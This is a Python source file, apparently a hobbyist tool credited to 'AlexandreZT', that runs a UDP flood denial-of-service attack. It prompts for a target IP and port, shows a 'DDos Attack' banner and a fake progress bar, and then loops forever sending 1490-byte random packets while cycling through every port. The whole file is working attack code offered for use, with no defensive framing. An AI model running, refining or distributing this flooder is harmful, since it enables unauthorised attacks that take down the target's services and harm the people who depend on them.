import sys
import os
import time
import socket
import random
import math
from pyfiglet import Figlet
#Code Time
from datetime import datetime

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("cls")

f = Figlet(font='slant')
print (f.renderText('DDos Attack'))


print ("Author : AlexandreZT")
print ("GitHub : https://github.com/AlexandreZT")

ip = input("IP Target : ")
port = eval(input("Port       : "))

# loadind ~10s
for i in range (1, 101, 1):
  os.system("cls")
  f = Figlet(font='slant')
  print (f.renderText('Attack Starting'))
  print("["+"="*int(math.ceil(i/5))+"]", "{0}%".format(i,))
  time.sleep(0.1)

os.system("cls")
f = Figlet(font='slant')
print (f.renderText('FIRE !!')) 
time.sleep(2)

sent = 0

while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1